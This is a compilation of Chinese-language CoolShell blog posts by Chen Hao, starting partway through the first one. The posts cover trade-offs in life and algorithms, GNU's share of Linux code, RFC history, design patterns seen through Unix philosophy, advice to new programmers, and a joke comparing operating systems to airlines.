#### 算法就是Trade-Off你根本没有办法能得到所有你想得到的东西， **任何的选择都意味着放弃** —— **当你要去获得一个东西的时候，你总是需要放弃一些东西** 。 **人生本来就是一个跷跷板，一头上，另一头必然下** 。这和我们做软件设计或算法设计一样，用时间换空间，用空间换时间，还有CAP理论，总是有很多的Trade-Off，正如这个短语的原意一样—— **你总是要用某种东西去交易某种东西** 。我们都在用某种东西在交易我们的未来，有的人用自己的努力，有的人用自己的思考，有的人用自己的年轻，有的人用自己的自由，有的人用自己的价值观，有的人用自己的道德…… …… 有的人在交换金钱，有的人在交换眼界，有的人在交换经历，有的人在交换地位，有的人在交换能力，有的人在交换自由，有的人在交换兴趣，有的人在交换虚荣心，在交换安逸享乐…… ……**每个人有每个人的算法，每个算法都有每个算法的purpose，就算大家在用同样的算法，但是每个人算法中的那些变量、开关和条件都不一样，得到的结果也不一样。我们就是生活在Matrix里的一段程序，我们每个人的算法决定着我们每个人的选择，我们的选择决定了我们的人生** 。
**2012年就要过去了，祝大家新年快乐！**!插图来自电影 Life of Pi插图来自电影 Life of Pi（全文完）# GNU/Linux下有多少是GNU的？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一个葡萄牙的学生写了一篇文章 《How much GNU is there in GNU/Linux?》 – GNU/Linux下有多少是GNU的。他的这篇文章主要分布了今年4月份的Ubuntu Natty的Linux分发包。其主要是用代码行来做的分析，其给了两个饼图。第一个饼图如下，其指明了各种主流的开源项目组的分布情况。可见GNU只占了8%，当然，GNome也是GNU的，加起来也只有13%，只占整个分发包很少的比重。第二个图，作者把GNU的部分拿了出来，再进行了分析：在下面这个图中，我们可以看到主要是四大块——gcc, gdb, binutils 和 glibc，所以，作者说，这些东西都不是最终用户需要的，不是每一个用户都是需要搞开发的。所以，如果去除这些，再去除Gnome（这个桌面UI也不是很力），那么GNU的东西几乎没有了。
所以，作者以此来挑战Richard Stallman提到的 GNU/Linux的这个说法。好像更为好的说法应该叫——**GNU/KDE/java/xorg/Linux**我对这篇文章有下述一些感觉：* 以代码行来衡量重要性，非常的不准确。比尔盖茨说过——“用代码行数来衡量编程的进度，就如同用航空器零件的重量来衡量航空飞机的制造进度一样”（参看《最佳编程语录》），所以，用这个数据来并不一定正确。如果用Linux的各种包的依赖性可能会更好一点。   * 至少我知道，离开了glibc，可能整个操作系统都会不举。Linux下，绝大多数软件都是gcc/gdb编程和调试出来的（当然，LLVM和Clang正在挑战着gcc编译器），而且大多数软件都在用着GPL的许可证（虽然开源世界的许可证是如此的混乱）   * 辩证地，我们不能否定GNU的历史价值，同时我们似乎也在看到GNU好像有点萎靡。老实说，其实叫什么不重要，是GNU/Linux也好，是Ubuntu 也好，还是Android也好，无所谓。Linux的各种分发包中都存在着全世界黑客文化的和开源文化的结晶，每当我看到这样的分布图时（例如：是谁写的Linux?），我心中都有一种说不出来的豪情，这难道不真是一种壮举吗？（Unix黑客文化的真正延伸")）。
不管这种方式的软件有没有市场，能不能得到“最终用户”的认可，但这已成为了软件开发的一种精神——那种不分彼此，相互协作的精神，不是吗？（全文完）# RFC1 40岁生日作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn昨天（2009年4月7日）是RFC 1的40岁生日。注意，这不是KFC，而是RFC。;-)1969年的今天，我们有一第一个RFC（）。这成为了以后整个Internet的基础。所谓RFC，全称为Request For Comments ，是一系列以编号排定的文件。文件收集了有关互联网相关资讯，以及UNIX和互联网社群的软件文件。目前RFC文件是由Internet Society（ISOC）所赞助发行。RFC包含了关于Internet的几乎所有重要的文字资料。如果你想成为网络方面的专家，那么RFC无疑是最重要也是最经常需要用到的资料之一，所以RFC享有网络知识圣经之美誉。通常，当某家机构或团体开发出了一套标准或提出对某种标准的设想，想要征询外界的意见时，就会在Internet上发放一份RFC，对这一问题感兴趣的人可以阅读该RFC并提出自己的意见；绝大部分网络标准的制定都是以RFC的形式开始，经过大量的论证和修改过程，由主要的标准化组织所制定的，但在RFC中所收录的文件并不都是正在使用或为大家所公认的，也有很大一部分只在某个局部领域被使用或并没有被采用，一份RFC具体处于什么状态都在文件中作了明确的标识。
**RFC的历史**RFC文件格式最初作为ARPA网计划的基础起源于1969年。如今，它已经成为IETF、Internet Architecture Board (IAB)还有其他一些主要的公共网络研究社区的正式出版物发布途径。最初的RFC作者使用打字机撰写文档，并在美国国防部国防前沿研究项目署（ARPA）研究成员之间传阅。1969年12月，他们开始通过ARPANET途径来发布新的RFC文档。第一份RFC文档由洛杉矶加利福尼亚大学（UCLA）的Steve Crocker撰写，在1969年4月7日公开发表的RFC 1。当初Crocker为了避免打扰他的室友，是在浴室里完成这篇文档的。在1970年代，很多后来的RFC文档同样来自UCLA，这不仅得益于UCLA的学术质量，同时也因为UCLA是ARPANET第一批Interface Message Processors (IMPs)成员之一。由Douglas Engelbart领导的，位于Stanford Research Institute的Augmentation Research Center (ARC)是四个最初的ARPANET结点之一，也是最初的Network Information Centre，同时被社会学家Thierry Bardini记录为早期大量RFC文档的发源地。
从1969年到1998年，Jon Postel一直担任RFC文档的编辑职务。随着美国政府赞助合同的到期，Internet Society（代表IETF），和南加州大学（USC）Information Sciences Institute的网络部门合作，（在IAB领导下）负责RFT文档的起草和发布工作。Jon Postel继续担任RFC编辑直到去世。随后，由Bob Braden接任整个项目的领导职务，同时Joyce Reynolds继续在团队中的担任职务。庆祝RFC的30周年的RFC文件是RFC 2555。**RFC文件的架构**RFC文件只有新增，不会有取消或中途停止发行的情形。但是对于同一主题而言，新的RFC文件可以声明取代旧的RFC文件。RFC文件是纯ASCII文字档格式，可由电脑程式自动转档成其他档案格式。RFC文件有封面、目录及页首页尾和页码。RFC的章节是数字标示，但数字的小数点后不补零，例如4.9的顺序就在4.10前面，但9的前面并不补零。RFC1000这份文件就是RFC的指南。**RFC文件的产生**RFC文件是由Internet Society审核后给定编号并发行。虽然经过审核，但RFC也并非全部严肃而生硬的技术文件，偶有恶搞之作出现，尤其是4月1日愚人节所发行的，例如RFC 1606: A Historical Perspective On The Usage Of IP Version 9（参见IPv9）、RFC 2324：“超文字咖啡壶控制协定”（ _Hyper Text Coffee Pot Control Protocol_ ，乍有其事的写了 **HTCPCP** 这样看起来很专业的术语缩写字）。以及如前面所提到纪念RFC的30周年庆的RFC文件。
**相关链接*** IETF RFC   * RFC Editor   * RFC的中译文档上面的资料来源于维基百科：http://zh.wikipedia.org/wiki/RFC# 从面向对象的设计模式看软件设计作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前些天发了一篇《如此理解面向对象编程》的文章，然后引起了大家的热议。然后我在微博上说了一句——“ **那23个经典的设计模式和OO半毛钱关系没有，只不过人家用OO来实现罢了……OO的设计模式思想和Unix的设计思想基本没什么差别** ”，结果引来了一点点争议。所以，我写下这篇文章把我的观点说明一下。我希望这样可以让大家更容易地理解什么是设计模式。 **我顺便帮OO和 Unix/Linux搞搞基** 。目录* 什么是模式   * GoF的23个设计模式   * 后记   * 餐后甜点   * 再送一个果盘#### 什么是模式在正式说明GoF的那23个经典的设计模式其实和OO关系不大并和Unix的设计思想很相似的这个观点之前，让我先来说说什么是模式？设计模式的英文是Design Pattern，模式是Pattern的汉译。所谓Pattern就是一种规则，或是一种模型，或是一种习惯。Pattern这个东西到处都是，并不只有技术圏子里才有。比如：
* 文章有文章的Pattern。如新闻有新闻的Pattern（第一段话简述了整个新闻），诗歌总是抒情的，论文总是死板的，讲稿总是高谈的，漫画总是幽默的，……   * 小说有小说的Pattern。比如，     * 武侠小说必然要整个武林大会，整几个NB的武功和大师，分个正派和反派，还有一个或数个惊天阴谋，坏人总是要在一开始占尽优势，好人总是要力挽狂澜……     * 言情小说总是要有第三者，总是要有负心人，里面的女子总是要哭得死去活来，但又痴心不改，……   * 新闻联播的模式是：头10分钟领导很忙，中间10分钟人民很幸福，后10分钟国外很乱。中国政府官方宣传稿也模式也很明显，各种赞美，口号，胜利，总是要坚持个什么，团结个什么，迈向个什么，某某精神，某某思想，群众情绪稳定，不明真相，等等……   * 春节的模式是，回家，吃饺子，放个鞭炮，给压岁钱，同学聚会…… 同学聚会的模式基本上都是在饭桌上回忆一下校园时光，比较一下各自的当前处境，调戏一下女同学……   * …… ……这就是Pattern，只要你细心观察，你会发现这世间有很多很多的Pattern。#### GoF的23个设计模式《设计模式》这本书中，GoF这四个人总结了23个经典的面向对象的设计模式，某中有5个创建模式，7个结构模式，11个行为模式。 **很多人都会觉得这是面向对象的设计模式，很多人也觉得非面向对象不能用这些模式。我觉得这是一种教条主义。** 就像《那些流行的编程方法》中的“设计模式驱动型编程”一样，就像《如此理解面向对象》一样的那么的滑稽。
好了，回到我的论点——“ **GoF的这23个设计模式和OO关系不大，并且和Unix的设计思想基本一致，只不过GoF用OO实现了它们** ”，就像我上面说过的那些生活中的Pattern一样，只要你仔细思考，你会发现这23个设计模式在我们的生活和社会中也能有他们的身影。而且也一样可以用OO的方式实现之。让我们来看看这23个经典的设计模式中的几个常用的模式：**Factory 模式** ，这个模式可能是是个人都知道的模式。这个模式在现实社会中就像各种工厂一样，工厂跨界的不多，基本上都是在生产同一类的产品，有的生产汽车，有的生产电视，有的生产衣服，有的生产卫生纸……基本上来说，一个生产线上只有做同一类的东西。这和Factory模式很相似。编程中，像内存池，线程池，连接池等池化技术都是这个模式，当然，Factory给你的一个对象，而不单单只是资源，factory创建出来的对象都有同样的接口可以被多态调用。 **这其实和Unix把所有的硬件都factory成文件一样，并提供了read/write等文件操作来让你操作任意设备的I/O** 。**Abstract Factor** y：抽象工厂这个模式是创建一组有同一主题的不同的类。这个模式在现实社会当中也有很多例子，比如：
* 移动公司的合约机计划，88套餐（通话100分钟，短信100条，彩信，20条，上网200M），128套餐（通话200分钟，短信150条，彩信50条，上网500M）……* 家里的装修，总是要有厨卫，有门，有灯，有沙发，有茶几，有床，有衣柜，有电视，有冰箱，有洗衣机……，这些都是必需的，只是每个家庭里的具体装修不一样。* Diablo游戏中的Normal，Hard，Nightmare，Hell模式，这些模式的怪和场景和故事情况都差不多，就是每个场景的怪物和装备的属性不一样。或是WarCraft中的地图就是一个Abstract Factory模式(注：Warcraft的地图什么都能干)。这和学校中的小学，初中，高中，大学差不多，都是一样的学习环境，一样的教学方式，一样的教室，都要期中考和期末考，都有班长和科代表，就是学的东西的难度不一样，但基本上都是语文，英语，数，理，化，还有永远都有的政治课。学校就是一个抽象工厂。这就是抽象工厂的业务模型（或是：Business Pattern），你觉得是不是不一定非要用OO来实现这样的模式？（我们思考一下，我们会不会被先入为主了，觉得不会OO都不知道怎么实现了），不用OO，用相同格式但内容不同的配置文件是不是也能实现？在Unix下 **，抽象工厂这个模式在Unix下就像是/etc/rcX.d下的那些东西，1代表命令行单用户，2，代表命令行多用户，3代表命令行多用户完整模式启动，5代表图形界面启动，0代表关机，6代表重启，你要切换的话，init <X>就行了**。
**Prototype模式** ，原型模式，复制一个类的实现。这个模式在现实中的例子也有很多：传真，复印，都是这个模式。 **Unix进程和Github项目的Fork就是一种。进程fork明显不是OO的模型** （参看：关于Fork的一道面试题）。用非OO的方法同样可以实现这个模式。**Singleton模式** ，单例模式。生活中，公司只有一个CEO，法律限制你只能有一个老婆，你只能有一个身份证号，一个TCP端口只能被一个进程使用，等等。软件开发方面，并不一定只有OO才能做到，你可以用一个全局变量，一个中心服务器，甚至可以使用行政手段来约束开发中不会出现多个实例。 **Unix下实现单例进程的一个最常用的实践是在进程启动的时候用“(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)”模式打开一个“锁文件”** 。**Adapter模式** ，适配器模式。可以兼容欧洲美国中国的插头或插座，万能读卡器，可以播放各种格式多媒体文件的插放器，可以解析FTP/HTTP/HTTPS/等网络协议的浏览器，可以兼容各大银行的银联接口、支付宝、Paypal、VISA等银行接口，可以适配各种后端的解释器的Nginx或Apache，等等。用非OO的编程方式就是重新包装成一个标准接口。 **这个模式很像Unix下的/dev下的那些文件，操作系统把系统设备适配成文件，于是你就可以使用read/write来进行读写了** 。
**Bridge模式** ，桥接模式。这个模式用的更多，比如一个灯具可以接各种灯泡或灯管，一个电钻可以换上不同的钻头来适应不同的材料，一辆汽车可以随时更换不同的轮胎来适应不同的路面，你的桌面可以随时更换一个图片来适应你的心情，你的单反相机可以更换不同的镜头来拍不同的照片…… 桥接模式说白了就是组件化，模块化，可以自由拼装。在OO中，其主要是通过让业务类组合一个标准接口来完成，这在非OO的程序设计中用得实在是太多了，主要是通过回调函数或是标准接口来实现。这个也是Unix设计哲学中的主要思想。 **在Unix中，文件的权限使用的就是Bridge模式，标准接口是用户，用户组和其它，rwx三个模式，然后用 chmod/chown改一改，这文件就有不同的属主和属性了** 。**Decorator模式** ，装饰模式。这个模式在生活中太多了，你给你的手机或电脑贴个什么，挂个什么，吃东西的时候加点什么佐料，多点肉还是多个蛋，一个Unix/Linux命令的各种参数是对这个命令的修饰，等等。 **我觉得这个模式在Unix中最经常的体现就是通过管道把命令连接起来来完成一个功能** ，比如：ps -elf 是列进程的，用管道 grep hchen就可以达到过滤的目的，grep的逻辑没有侵入ps中，grep 修饰了 ps，但是其组合起来完成了一个特定的功能。可见，这和OO没有什么关系。
**Facade模式，** 这个模式我们每个人从会编程的时候就在无意识地用这个模式了。这个模式就是把一大堆类拼装起来，并统一往外提供提口。在现实生活中这样的例子太多了，比如：旅行社把机票，酒店，景点，导游，司机，进店打了一个包叫旅行；IBM把主机，存储，OS，J2EE，DB，网络，流程打了个包叫企业级解决方案。Unix中最典型的一个例子就是用Shell脚本组合各种命令来创造一个新的功能，这是的Shell中的各种命令通过标准I/O这个接口进行组合交互。**Proxy模式** ，代理模式。我们租个房，买个机票，打个官司，都少不了代理，人大代表代理了老百姓去行使政治权力。我们去饭馆里吃饭也是一种代理模式，因为我们只管吃就好了，洗菜做饭洗碗的工作都被Proxy帮你干了，于是你就省事多了。操作系统就是硬件的代理，CDN就是网站的代理，……使用代理你可以让事情变理更简单，也可以在代理层加入一些权限检查，这样可以让业务模块更关注业务，而把一些非业务的事情剥离出来交给代理以完成解耦。可见这个模式和OO没啥关系。 **Unix下这个模式最佳体现就是Shell，它代理了系统调用并提供UI** 。还有很多命令会帮你把/proc目录下的那些文件内容整理和显示出来。
**Chain of Responsibility模式** ，劫匪来抢银行，保安搞不定，就交给110，110搞不定就交给武警。有什么事件发生时的响应的Escalation Path，办公中的逐级审批。这个模式用一个函数指针数组或是栈结构就可以实现了。这个思想很像编程中的异常处理机制，一层一层地往上传递异常直到异常被捕捉。 **在Unix下，一个最简单的例子就是用 && 或 || 来把命令拼起来，如：cmd1 && cmd2 或 cmd3 || cmd4 ， 如果cmd1失败了，cmd2就不会执行，如果cmd3失败了，cmd4才会执行。**如： cd lib && rm -rf .o 或 ping -c1 coolshell.cn && ssh [[email protected]](/cdn-cgi/l/email-protection)**Command模式** ，这恐怕是软件里最多的模式了，比如：编译器里的Undo/Redo，宏录制。还有数据库的事务处理，线程池，设置向导，包括程序并行执行的指令集等等。这个模式主要是把一个对象的行为封装成一个一个的有相同接口的command，然后交给一个统一的命令执行器执行或管理这些命令。 **这个模式和我们的Unix/Linux机器启动时在/etc/init.d下的那些S和K开头的脚本很像，把各种daemon的启动和退出行为封装成一个脚本其支持reload/start/stop/status这样的命令，然后把他们按一定的规范做符号链接到/etc/init.d目录下，这样操作系统就会接管这些daemon的启动和退出** 。
**Observer模式** ，观察者模式，这个模式也叫pub- sub模式，很像我们用手机订阅手机报，微博的follow的信息流也是这样的一个模式。MVC中的C会sub V中的事件，用非OO的方式其实也是一个回调函数的事。在很多异步系统中，你需要知道最终的调用有没有成功，比如说调用支付宝的支付接口，你需要向支付宝注册一个回调的接口，以便支付宝回调你。 **Linux下的一些系统调用如epoll/aio/inotify/signal都是这种思路** 。**Strategy 模式** ，策略模式，这个模式和Bridge模式很像，只不过Bridge是结构模式，其主要是用于对象的构造；而Strategy是行为模式，主要是用于对象的行为。策略模式很像浏览器里的各种插件，只要你装了某个插件，你就有某个功能。你可以安装多个插件来让你的浏览器有更多的功能（书本上的这个模式是你只能选用一个算法，当然，我们不用那么教条）。 **就像《你可能不知道的Shell》中的那个设置设置$EDITOR变量后可以按ctrl+x e启动编译器，或是用set -o vi或set -o emacs 来让自己的shell像vi或 emacs 一样，或是像find -exec或xargs一样的拼装命令**。
**Bridge 和 Strategy是OO设计模式里的“Favor Composition Over Inheritance” 的典范，其实现了接口与实现分离的** 。Unix中的Shell就是一种，你可随意地更换不同的Shell。还有Emacs中的LISP驱动C，C实现了引擎，交给LISP实现逻辑。把程序分为前端和后端，通过socket专用应用协议进行通讯，前端实现策略，后端实现机制。再看看makefile把编译器和源代码的解耦，命令行输出这个接口可以把一个复杂的功能解耦并抽像成各种各样小而美的小功能命令，等等这样的例子，你会发现，还有大量的编程框架都会多少采用这样的思想，可以让你的软件像更换汽车零件一样方便。我在用Unix的设计思想来应对变更的需求中说过灯具厂，灯泡厂，和开关厂的例子。#### 后记因为写作仓促，上面的那些东西，可能会你让你觉得有些牵强，那么抱歉了，你可以帮我看看在生活中和 Unix里有没有更帅的例子。不过，我们会发现上面OO搞出来的那么多模式在Unix下看来好像没有那么复杂，而且Unix下看起来并没有那么多模式，而且Unix中的设计模式无非就是这么几个关键词： **单一，简洁，模块，拼装** 。我们再来看看OO设计的两大准则： **1）钟情于组合而不是继承，2）依赖于接口而不是实现** 。还有S.O.L.I.D原则也一样（如果你仔细观察，你会发现SOLID原则在Unix下也是完美地体现）。你看，Unix和OO设计模式是不是完美的统一吗？
我有种强烈的感觉—— **Unix对这些所谓的OO的设计模式实现得更好** 。因为Unix就一条设计模式！再次推荐《 _The Art of Unix Programming_ 》!Unix Kiss#### 餐后甜点我上面提到了《 _The Art of Unix Programming_ 》，所以我有必要再谈谈这本书中我中毒最深的一章《模块性：保持清晰和简洁》中所谈到的胶合层。胶合层这一节中说了，我们开发软件一般要么Top-Down，要么Bottom- Up，这两种方法都有好有不好。顶层一般是应用逻辑层，底层一般是原语层（我理解为技术沉淀层，或是技术基础层）。自顶向下的开发，你可能会因为开发到底层后发现底层可沉淀的东西越来越不爽（因为被可能被很多业务逻辑所侵入），如果自底向上的开发，你可能越到上层你越发现很多你下面干的基础上工作有很多用不上（比如干多了）。所以，最好的方式是同时进行，一会顶层，一会底层，来来回回的开发——说白了就是在开发中不断的重构，边开发边理解边沉淀。无论怎么样，你会发现需要一层胶合层来胶合业务逻辑层和底层原语层（软件开发中的业务层和技术层的胶合），Unix的设计哲学认为，这层胶合层应该尽量地薄，胶合层越多，我们就只能在其中苦苦挣扎。
其实， **胶合层原则就是分离原则上更为上层地体现，策略（业务逻辑）和机制（基础技术或原语）的清楚的分离。你可以看到，OO和Unix都是在做这样的分离。但是需要注意到的时，OO用抽象接口来做这个分离——很多OO的模式中，抽象层太多了，导致胶合层太过于复杂了，也就是说，OO鼓励了——“厚重地胶合和复杂层次”，反而增加了程序的复杂度（这种情况在恶化中）。而Unix采用的是薄的胶合层，薄地相当的优雅** 。（通过这段话的描述，我相信你会明白了《如此理解面向对象编程》中的个例子——为什么用OO来实现会比用非OO来实现更为地恶心——那就是因为OO胶合层太复杂了）**OO的最大的问题就——接口复杂度太高，胶合层太多！** （注：Unix编程艺术这本书里说了软件有三个复杂度：代码量、接口、实现，这三个东西构成了我们的软件复杂度）#### 再送一个果盘大家一定记得《SteveY对Amazon和Google平台的长篇大论》中Amazon中那个令人非常向往的SOA式的架构。因为以前在Amazon，有些话不好说。现在可以说了，我在Amazon里，我个人对这个服务化的架构相当的不待见，太复杂，复杂以乱七八糟，方向是好的，想法也是好的，但是这东西和OO一样，造成大量的接口复杂度，今天的Amazon，完全没人知道各个服务是怎么个调用的，一团乱麻（其内部并不像你看到的AWS那么的美妙。注：AWS是非常不错的，是相当好的设计）。
**那么我们怎么来解决SOA的接口复杂度问题？其实，Unix早就给出了答案——数据驱动编程** （详见：《Unix编程艺术》的第9.1章），在我离开Amazon的时候，美国总部的Principle SDE们在吐槽今天Amazon的SOA架构，更好的架构应该是数据驱动式的。（今天还在Amazon的同学可以上内网boardcast上看看相关的Principle Talk视频）（瞎扯一句：这本来是我想在2012年杭州QCon上的分享的一个主题，无奈当时被大会组织者给拒了，所以只好讲了一个《建一支小团队》，今天有多人还是不能明白甚至反感我的那个《小团队》的演讲，但是我相信那是必然的趋势，就像十年前大家在说“程序员只能干到30岁”时，当时的我我却毫不犹豫地相信十年后，30岁以上的有经验的老程序员一定会成为各个公司角逐和竟争的红人）# 给程序员新手的一些建议作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前段时间因为实习生计划花了很多时间做了实习生招聘的工作，产生的一些想法，写在这里。这次招聘过程中，我发现我们在校的学生有下面的这些特点：**1）NB的项目。** 当说到自己做过的项目时， 我发现他们做的事都是很NB。要么是研究Linux的底层内核，要么是图像识别处理，要么是推荐算法，要么做高性能计算，要么做数据挖掘，要么是移动方面的协议，还有一些很高深的课题我听不太懂的项目。这让我想起当年我在学校里的实习，对比起我用Java Applet 和 HTML做操作系统的教学课件，或是在公司里用Delphi/PowerBuilder做的那些MIS系统。让我觉得有些汗颜。
**2）OK的解决问题能力。** 当问到算法题时，我发现他们的问题解决能力还OK。我一般问1到2个中低难度的算法题和1个基本的面向对象设计的题，都不难。我相信只要在学校里好好学习的人都应该答得出来。无非就是一些基本的算法和基本数据结构操作的问题，和比较基础的面向对象设计的题，说白了就是作业题。可惜的是，只有5%不到的同学能够在不给提示的情况下答出来，70%的人可以在给一定的提示下答出来，15%左右的同学需要提示到几乎给出答案才能答出来，还有10%的同学怎么给提示都答不出来。**3）WTF的编码能力** 。老实说，对于解算法题，我还是比较可以接受的，因为80%左右的同学在给予提示后都能描述出解题的算法，于是，我让他们把这个算法用他们最熟悉的语言写出来。但结果让我出乎意料，一段在解法很清楚的情况下只需要不到30行代码的小算法题，只有一个人能在10分钟几写完，其它的人基本所有的需要30分钟左右（甚至40分钟），有2、3个人居然写不出来。有一个比较极端的case是——有个同学花了十分钟都写不出从一个整型数组中找到最小的正数的代码。这个事让我觉得很惊讶，难道大家在做项目的时候不编程吗？对于这种情况，我想给大家以下后一些建议：
* 我感到我们在校的学生正如“为什么中国的网页这么烂”中所说的—— **他们习惯于获取大量的知识，而从不对这些知识进行思考和总结** 。问题不是我们知道多少东西，问题是我们在获取这些知识的时候会不会去思考这些知识后的东西？比如：为什么会有这么多经典的数据结构，数组，链表，树，哈希表，图这些数据结构主要用来解决什么样的问题，他们的优势和劣势是什么？ **没有思考过，就不算真正的懂，没有思考过，你将无法应对万变的问题，没有思考过，你将成为书呆子** 。* **多多实践而不是研究** 。编程不是在实验室做科研搞理论啊，计算机这本就是一个实践性很强的的学科啊，这不是数学，这需要你多多的实践啊。我们不要真以为读的是——计算机科学（Computer Science ）就是搞理论的了，这里面需要很多很多的Engineering的工作。（我实在是很难想像，居然有这么多人写一般难度的程序居然会是那么痛苦的事）* 我在我的新浪微博（@左耳朵耗子）里说的，我们不要以为做过项目，会写程序，我们就是程序员了。如果你只是在按部就班地写代码，你就是Coder，江湖叫“码农”，不要把自己当成“码农”，我们一定要对自己的代码，自己的设计不停地反思和总结，并精益求精，写程序本来就是一件有价值的事，这就像写篇作文人人都会写，但并不是人人都能把文章写好。 **编程和写作都是一样的，这都是在搞创作啊。想做“码农”还是想做“程序员”？自己决定吧** 。
* **我们的教育的确很“废柴”，但这不是我们成为“废柴”的原因** 。如果我们的学习还停留在“别人给我什么我就学什么”的被动学习阶段，那么你真的不懂怎么是学习。虽然，我们的学校里并没有教你什么是“Version Control”，什么是“Coding Style”，什么是“Refactory”，什么是“Code Review”，什么是“Unit Test”，也没有告诉你一些经典的设计的和架构，等等，等等，但是这是什么年代了？这个时代不是像我上学那时——学校机房里上机用的电脑连内存和硬盘都没有，用5寸的低密软盘面对绿色显示器的286，上网还要“猫”，而且贵的要死（一小时22元），而且网上什么都没有时代了。 **我们身边有很多很多优秀的人，网上有很多优秀的文章，书店里也有很多不错的书，而且我们的软件开发日趋成熟，如果我们还学不好的话，那么我们就是在犯罪！**最后，和大家说一下公司的实习生招聘。这个事情其实是毕业生招聘的一个组成部分，也就是说，因为我国教育的问题，再加上学生自己的问题，导致毕业生量多质次的情况很严重，对于公司，其很难从学校招到一个比较不错的毕业生，这种情况已经不是新问题了，所以，也有很多公司都不招刚毕业的学生。因此，通过实习机会了解并招聘毕业生成了很多公司的毕业生招聘的手段。所以，在这里想告诉在校的同学们，千万不要以为实习计划就是字面上的实习。其实，这和正式的招聘没有什么差别，同样也要看你的能力的。
（全文完）# 操作系统航空公司作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Linux 航空公司 我们知道，不同的操作系统有不同的系统，不同的风格，那么，如果操作系统和航空公司，会是怎么样的一种情况？让我们尝试地来做这样一个幽默的类比，把操作系统的特点带到航空公司，让我们看看会是怎么样的一个情况。**UNIX Airways**Unix航空公司需要每一个人在乘机的时候带上一个飞机零件，他们会在飞机跑道上把飞机的这些零件一片一片地组装起来，然后，在不停地争论着倒底是要建造什么样的飞机。是AIX，还是Solaris？是FreeBSD还是HP- UX？……**Air DOS**DOS 航空公司的飞机需要每一位乘客在后面推飞机直到飞机开始滑行，然后他们跳上飞机并且跟着飞机一起沿着海岸滑行直至飞机再次掉到地面，然后乘客们再次推动飞机，然后跳上飞，如此循环不止……**Mac Airlines**Mac航空公司中，所有的乘务员，机长，行李搬运工，和机票代理无论是看上去还是行为上都是完全一致的。每次当你询问细节的时候，他们都会很绅士地但很坚定地告诉你，你不需要知道那么多的细节，也没有必要知道，所有一切的事情都已经在你不需要知道的情况下完成了，所以，你只需要shut up。
**Windows Air**Windows航空公司的航站楼是那么的漂亮和多彩，并且有非常友好的乘务员，相当简单的行李和乘机手续，同样平滑的离站程序。但是，当飞机起飞10分钟后，通常飞机会在没有任何警告的情况下就爆炸了。**Windows NT Air**Windows NT航空公司和Windows航空公司一样，但是他的成本更高，使用更大型的飞机，并且当其爆炸的时候，你可以换乘在40英里半径内的其它飞行器。**Windows XP Air**您所在的这个机场，根据合同，只允许乘坐XP的航空飞机。所有的飞机是相同的，明亮的色彩，以及比原来的需要大3倍。XP航空公司的标志是巨大的，并都指向相同的方向。无论你走哪一条路，有些身穿斗篷和戴着尖角帽子的人会坚持地跟着你走。你的行李和衣物都会被拿走并被XP航空套装和相同的XP手提箱所取代，你周围的人都和你有一样套装和手提箱，当然，这些东西的成本都会包含在机票中。如果你不签合，飞机不会起飞。飞机途中的娱乐表演承诺和实际是一样的，那就是米老鼠动画片会一遍一遍地播放。在你需要吃东西喝饮料的前，你不得不先打电话给你的旅行社。在整个航行过程中你都被会搜索。如果你去厕所两次以上，你得再补一张票。无论你所预订的目的地是哪里，你永远都会最终被迫降在加拿大的惠斯勒（Whistler）。
**OS X Air**你进入了一个白色的航站楼，你所能看到的是一个坐在角落白桌子后面的一位女士，你走上去取你的机票。她微笑地对你说，“欢迎乘座OS X航空公司，请您允许我给您照张相”，她一边指向了在墙上你没注意到的已经给你拍了照的照相机，一边对你说，“谢谢，这是您的机票”。一张最少上面有你照片的机票被递到了你的手上，上面已经有了你所有的信息。你右边的一扇门打开了，你走了进去，你看到了一个很宽敞的空间，只有一个座位在中间，你坐下，听着音乐，看着电影，直到飞行结束。你自始至终都不会看到其它的乘客。当你登陆下机的时候，你对你自己说：“哇，这确实相当的好啊，但感觉好像少了些什么”。**Windows Vista Airlines**你进入了一个非常漂亮的航站楼，旁边停着一架你从未见过的超级大的飞机。每隔10英尺，都会有一个安全人员出现，并问你是否“确认”你想要继续向前乘坐飞机，或者你可以取消这个飞行，当然，我们并不知道取消会意味着什么。你继续前行到一个桌子前询问为什么这架飞机那么大？在安全人员向你确认过你需要问问题并且你确实要听到回答后，工作人员告诉你，这是世界上最大的飞机，是因为它可以让乘客们感觉更好，但是因飞机的需求需要把飞机被设计成要比正常飞行速度慢两倍，所以他们只好加大尺寸，这样才能达到让他速度变慢的目标。
一旦上了飞机，每一个乘客都会被乘务员单独地询问是否真的想要乘坐本次航班，因为这是公司的制度规定。同样，机场还会再向大家再次询问同样的问题。当你回答了若干次“是”以后，你却被一些陌生人（黑客）在你的脸上打了一拳，因为那些陌生人问你：“你真确定我可以打你的脸吗？‘确定’或是‘取消’”，而你却条件反射地回答了“确定”。在起飞的以后，飞行员意识到飞机的起落架驱动没有被更新，不能和新型的飞机在一些工作。所以，在整个飞机过程中，起落架都在处于降落的状态。这样一来，整个飞机飞行得更慢，但是飞行员继续飞行这样飞机，他们希望起落架的生产产商会尽快地给一个最新版本符合Vista航空公司标准的起落架驱动程序更新。终于，你到达了你的目的地，你却得到的是Windows XP航空公司的奖励里程而不是尝试新型的飞机的奖励。你的一个亲密的朋友在听过你的故事以后，告诉你Linux航空公司会好得多。**Linux Air**对其它所有航空公司都不满的员工决定离开他们自己的航空公司。他们开始自己建造飞机，机票柜台，以及自己铺设飞机跑道。他们只用很少的费用给你提供可打印的机票，但你完全可以自己下载下来打印机票。当你登机的时候，会有人递给你一个座位，四个螺栓，一个扳手和一本“安装座位- HOWTO.html”手册。一但安装好了，可随意调整或更改的座位可能让你相当地舒服，从飞机离开到目的地，其几乎不会发生一个错误，而且，飞机过程中的飞行餐非常不错。你会想去告诉选乘别的航空公司的乘客你那完美的经历，但你所能得到的回答是一句反问，“乘座飞机还要自己去安装自己的座位？”。
